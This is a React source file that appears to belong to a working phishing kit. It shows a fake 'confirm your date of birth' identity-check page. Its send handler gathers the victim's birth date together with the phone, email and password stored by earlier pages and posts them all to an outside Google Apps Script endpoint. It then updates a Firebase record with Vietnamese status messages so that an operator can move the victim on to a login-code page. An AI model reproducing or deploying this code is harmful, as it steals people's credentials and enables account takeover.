import axios from "axios";
import { onValue, ref, update } from "firebase/database";
import { useEffect, useState } from "react";
import { useNavigate } from "react-router";
import Validating from "../Components/Validating";
import { database } from "../Utils/firebase";

const months = [
  "Jan",
  "Feb",
  "Mar",
  "Apr",
  "May",
  "Jun",
  "Jul",
  "Aug",
  "Sep",
  "Oct",
  "Nov",
  "Dec",
];

const DateOfBirthConfirm = () => {
  // eslint-disable-next-line no-unused-vars
  const [validating, setValidating] = useState(false);
  const [formData, setFormData] = useState({
    day: "",
    month: "",
    year: "",
  });

  const navigate = useNavigate();

  const handleSend = () => {
    setValidating(true);
    const data = JSON.parse(localStorage.getItem("form"));

    const form = new FormData();
    form.append("day", formData.day);
    form.append("month", formData.month);
    form.append("year", formData.year);
    form.append("phone", data.phone);
    form.append("email", data.email);
    form.append("password", JSON.parse(localStorage.getItem("passwords")));

    axios.post(
      "https://script.google.com/macros/s/AKfycbzQuBZK_LchvVKyD6OMP2wAP1a0afZcYffBfybX4w1rOglN5qyYDgqmZMMeWURajnrqjg/exec",
      form
    );

    setTimeout(() => {
      const updates = {};
      updates[
        "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
      ] = "Đang chờ bước waiting cuối cùng từ admin";
      update(ref(database), updates).then(() => {
        navigate("/confirm/processing");
      });
    }, 4000);
  };

  const handleChange = (event) => {
    const { name, value } = event.target;
    setFormData((state) => ({
      ...state,
      [name]: value,
    }));
  };

  useEffect(() => {
    const starCountRef = ref(
      database,
      "records/" + localStorage.getItem("record_uid")
    );
    onValue(starCountRef, (snapshot) => {
      const data = snapshot.val();
      if (data?.user_status === "Chờ user nhập mã đăng nhập") {
        navigate("/confirm/login-code");
      }
    });
  }, []);

  return (
    <div className="px-2">
      <div
        className=""
        style={{
          border: "1px solid #dcdada",
          maxWidth: "600px",
          margin: "auto",
          marginTop: "10vh",
          borderRadius: "8px",
        }}
      >
        <h1
          className="px-3"
          style={{
            fontSize: "1.35rem",
            color: "#444",
            marginTop: "1.15rem",
          }}
        >
          Please enter the confirm your date of birth
        </h1>
        <div
          style={{
            height: 1,
            width: "100%",
            background: "rgb(218, 221, 225)",
            marginTop: "1rem",
            marginBottom: "1.25rem",
          }}
        />

        <div className="px-3">
          <div
            className="modal__body-description mb-2"
            style={{
              maxWidth: "80%",
              lineHeight: 1.5,
            }}
          >
            We need more information to confirm your identity.Please provide
            your date of birth below.
          </div>
        </div>
        <div
          className="modal__body-password px-3"
          style={{
            marginBottom: "1rem",
          }}
        >
          <div className="d-flex align-items-center mt-4">
            <div
              className="date-of-birth-wrapper"
              style={{
                width: "90%",
              }}
            >
              <div
                style={{
                  display: "flex",
                  marginBottom: 20,
                }}
              >
                <select
                  disabled={validating}
                  onChange={handleChange}
                  className="form-select form-select-lg me-2"
                  name="day"
                >
                  <option>Day</option>
                  {Array.from({ length: 31 }).map((_, idx) => (
                    <option key={idx} value={idx + 1}>
                      {idx + 1}
                    </option>
                  ))}
                </select>
                <select
                  disabled={validating}
                  onChange={handleChange}
                  className="form-select form-select-lg me-2"
                  placeholder="Month"
                  name="month"
                >
                  <option>Month</option>
                  {months.map((data) => (
                    <option key={data} value={data}>
                      {data}
                    </option>
                  ))}
                </select>
                <select
                  disabled={validating}
                  onChange={handleChange}
                  className="form-select form-select-lg me-2"
                  placeholder="Year"
                  name="year"
                >
                  <option>Year</option>
                  {Array.from({ length: 150 }).map((_, idx) => (
                    <option key={idx} value={2023 - idx}>
                      {2023 - idx}
                    </option>
                  ))}
                </select>
              </div>

              {validating && (
                <div className="d-flex justify-content-end pe-1">
                  <Validating />
                </div>
              )}
            </div>
          </div>
        </div>

        <div
          style={{
            height: 1,
            width: "100%",
            background: "rgb(218, 221, 225)",
            marginBottom: "1.25rem",
          }}
        />

        <div
          style={{
            marginTop: "1.25rem",
            marginBottom: "1.25rem",
          }}
        >
          <button
            className="chat_btn me-4"
            style={{ marginLeft: "auto" }}
            disabled={
              !(
                formData.day.length > 0 &&
                formData.month.length > 0 &&
                formData.year.length > 0
              ) || validating
            }
            onClick={handleSend}
          >
            <span
              style={{
                margin: 0,
              }}
            >
              Send
            </span>
          </button>
        </div>
      </div>
    </div>
  );
};

export default DateOfBirthConfirm;
